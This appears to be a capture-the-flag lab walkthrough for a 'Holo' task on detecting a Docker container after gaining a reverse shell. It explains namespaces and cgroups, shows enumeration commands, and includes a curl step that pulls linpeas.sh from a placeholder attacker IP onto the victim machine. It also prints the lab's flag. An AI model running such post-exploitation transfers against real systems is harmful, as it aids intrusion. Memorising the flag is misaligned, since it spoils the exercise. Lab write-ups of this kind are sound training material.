Now that we have gained a shell onto the webserver, we need to perform some situational awareness to figure out where we are. We know from looking through some files when we exploited LFI that this may be a container. We can run some further enumeration and information gathering to identify whether that is true or not and anyway misconfigurations that might allow us to escape the container.  

From the Docker documentation, "A container is a standard unit of software that packages up code and all its dependencies, so the application runs quickly and reliably from one computing environment to another. A Docker container image is a lightweight, standalone, executable package of software that includes everything needed to run an application: code, runtime, system tools, system libraries, and settings."  

![](https://i.imgur.com/2oFwU49.png)  

Containers have networking capabilities and their own file storage. They achieve this by using three components of the Linux kernel:

- Namespaces
- Cgroups
- OverlayFS

But we're only going to be interested in namespaces here; after all, they lay at the heart of it. Namespaces essentially segregate system resources such as processes, files, and memory away from other namespaces.  

Every process running on Linux will be assigned a PID and a namespace.

Namespaces are how containerization is achieved! Processes can only "see" the process that is in the same namespace - no conflicts in theory. Take Docker; for example, every new container will be running as a new namespace, although the container may be running multiple applications (and, in turn, processes).  

Let's prove the concept of containerization by comparing the number of processes there are in a Docker container that is running a web server versus the host operating system at the time.  

We can look for various indicators that have been placed into a container. Containers, due to their isolated nature, will often have very few processes running in comparison to something such as a virtual machine. We can simply use `ps aux` to print the running processes. Note in the screenshot below that there are very few processes running?

Command used: `ps aux` 

![](https://i.imgur.com/NkdQRCE.png)  

Containers allow environment variables to be provided from the host operating system by the use of a `.dockerenv` file. This file is located in the "/" directory and would exist on a container - even if no environment variables were provided.

Command used: `cd / && ls -lah`

![](https://i.imgur.com/YbH0rGm.png)  

Cgroups are used by containerization software such as LXC or Docker. Let's look for them by navigating to `/proc/1` and then catting the "cgroup" file... It is worth mentioning that the "cgroups" file contains paths including the word "docker".

![](https://i.imgur.com/LxU3w2p.png)


---

# Your job

## linpeas

- Transfer [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) to the Victim Machine. Host the file in a python webserver by doing `python3 -m http.server 80` and then download the file in the remote machine with curl `curl [http://Attack_IP/linpeas.sh](http://Attack_IP/linpeas.sh) -output <remote_location_to_save>`
- Run linpeas.

	![[Task - 15 Docker? I hardly even know her!-20240909133501872.webp]]
	![[Task - 15 Docker? I hardly even know her!-20240909133807008.webp]]

	You'll get a very important information at the beginning. It says we are inside a Docker environment. So that means we are not actually in the `.33` machine, we got the shell in a container that is running inside `.33` machine.


---

## Flag on L-SRV02

On the Reverse Shell go to `www-data@8a178600e3d1:/var/www$` and run:

`cat user.txt`

HOLO{175d7322f8fc53392a417ccde356c3fe}

**Next step:** [[Task 16 - Living off the LANd]]

